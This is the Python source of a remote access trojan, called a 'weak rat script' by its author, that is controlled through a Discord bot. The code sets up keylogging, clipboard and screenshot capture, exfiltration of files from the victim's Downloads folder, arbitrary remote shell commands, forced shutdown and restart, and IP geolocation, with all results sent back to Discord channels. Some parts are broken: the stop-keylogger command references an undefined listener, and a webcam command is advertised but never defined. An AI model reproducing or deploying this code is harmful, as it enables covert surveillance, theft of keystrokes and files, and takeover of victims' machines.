# weak rat script written in an hour might get an update idk

import os
import platform
import discord
import subprocess
import requests
import datetime
import socket
import pyautogui
import shutil
from discord.ext import commands
from discord import Embed, File
from pynput.keyboard import Key, Listener
from mss import mss
import pyperclip
import logging

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

config = {
    'token': "???", # Enter bot token
    'server_id': '???' # enter server id
}

active_sessions = {}
keyloggers = {}

def get_ip():
    url = "http://ipinfo.io/json"
    response = requests.get(url)
    data = response.json()
    return data['ip']

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    await bot.change_presence(activity=discord.Game(name="OWO Listener | Monitoring"))

    guild = bot.get_guild(int(config['server_id']))
    if guild:
        category = discord.utils.get(guild.categories, name="Sessions")
        if not category:
            category = await guild.create_category("Sessions")

        pc_name = socket.gethostname().lower()
        ip_address = get_ip()
        session = discord.utils.get(category.channels, name=ip_address)

        if session:
            active_sessions[ip_address] = session
            print(f"Reconnected to session with IP {ip_address}.")
        else:
            session = await category.create_text_channel(ip_address)
            active_sessions[ip_address] = session
            print(f"New session created for IP {ip_address}.")

        embed = Embed(
            title="OWO Listener Connected",
            description=f"Connected to IP: {ip_address} :white_check_mark:\n**Use !help for Commands**",
            color=discord.Color.green()
        )
        await session.send(embed=embed)
    else:
        print("Server not found.")

@bot.command()
async def help(ctx):
    message = """**
OWO Listener Commands:

Remote Control:
  !screenshot: Capture a screenshot of the target system
  !webcam: Capture a picture from the webcam

System Information:
  !time: Get the target's current time
  !ipinfo: Fetch IP and location info
  !sysinfo: Get system details
  !usage: Show disk and CPU usage

File Management:
  !downloads: List files in the Downloads folder
  !getfile <file_name>: Download a file from the target system

System Control:
  !restart: Restart the target system
  !shutdown: Shut down the target system

Keyboard Actions:
  !startkeylogger: Start logging keystrokes
  !stopkeylogger: Stop logging keystrokes
  !dumpkeylogger: Fetch the logged keystrokes
  !clipboard: Retrieve clipboard contents

Remote Shell:
  !shell <command>: Execute a system command on the target machine
**"""
    await ctx.send(message)

@bot.command()
async def startkeylogger(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        def on_press(key):
            try:
                keyloggers[ip_address].append(str(key.char))
            except AttributeError:
                keyloggers[ip_address].append(str(key))

        keyloggers[ip_address] = []
        listener = Listener(on_press=on_press)
        listener.start()
        await session.send(f"Keylogger activated for IP {ip_address}.")

@bot.command()
async def stopkeylogger(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session and ip_address in keyloggers:
        listener.stop()
        await session.send(f"Keylogger deactivated for IP {ip_address}.")

@bot.command()
async def dumpkeylogger(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session and ip_address in keyloggers:
        log_data = "\n".join(keyloggers[ip_address])
        with open(f'{ip_address}_keylog.txt', 'w') as f:
            f.write(log_data)
        await session.send(file=discord.File(f'{ip_address}_keylog.txt'))
        os.remove(f'{ip_address}_keylog.txt')

@bot.command()
async def clipboard(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        content = pyperclip.paste()
        await session.send(f"Clipboard content: {content}")

@bot.command()
async def downloads(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
        files = os.listdir(download_dir)
        await session.send(f"Files in Downloads: \n" + "\n".join(files))

@bot.command()
async def getfile(ctx, file_name: str):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        download_dir = os.path.join(os.path.expanduser("~"), "Downloads")
        file_path = os.path.join(download_dir, file_name)
        if os.path.exists(file_path):
            await session.send(f"Sending file: {file_name}")
            await session.send(file=discord.File(file_path))
        else:
            await session.send(f"File not found: {file_name}")

@bot.command()
async def screenshot(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    with mss() as sct:
        screenshot_path = os.path.join(os.getenv('TEMP'), "screenshot.png")
        sct.shot(output=screenshot_path)
    await ctx.send("[*] Screenshot captured successfully.", file=discord.File(screenshot_path))
    os.remove(screenshot_path)

@bot.command()
async def shutdown(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        os.system("shutdown /s /t 0")
        await session.send("System shutting down...")

@bot.command()
async def restart(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        os.system("shutdown /r /t 0")
        await session.send("System restarting...")

@bot.command()
async def shell(ctx, *, command: str):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
            with open("command_output.txt", "w") as f:
                f.write(result)
            await session.send(file=discord.File("command_output.txt"))
            os.remove("command_output.txt")
        except subprocess.CalledProcessError:
            await session.send("Error executing command.")

@bot.command()
async def sysinfo(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        system_info = platform.uname()
        embed = Embed(title="System Information", color=discord.Color.blue())
        embed.add_field(name="System", value=f"```{system_info.system}```", inline=False)
        embed.add_field(name="Node Name", value=f"```{system_info.node}```", inline=True)
        embed.add_field(name="Release", value=f"```{system_info.release}```", inline=True)
        embed.add_field(name="Version", value=f"```{system_info.version}```", inline=True)
        embed.add_field(name="Processor", value=f"```{system_info.processor}```", inline=True)
        await session.send(embed=embed)

@bot.command()
async def time(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        current_time = datetime.datetime.now().strftime("%H:%M:%S")
        current_date = datetime.date.today().strftime("%Y-%m-%d")
        await session.send(f"Current time: {current_time}\nCurrent date: {current_date}")

@bot.command()
async def ipinfo(ctx):
    ip_address = get_ip()
    session = active_sessions.get(ip_address)
    if session:
        response = requests.get("http://ipinfo.io/json")
        ip_data = response.json()
        embed = Embed(title="IP Information", color=discord.Color.orange())
        embed.add_field(name="IP", value=f"```{ip_data['ip']}```", inline=False)
        embed.add_field(name="City", value=f"```{ip_data['city']}```", inline=True)
        embed.add_field(name="Region", value=f"```{ip_data['region']}```", inline=True)
        embed.add_field(name="Country", value=f"```{ip_data['country']}```", inline=True)
        embed.add_field(name="ISP", value=f"```{ip_data['org']}```", inline=False)
        await session.send(embed=embed)

bot.run(config['token'])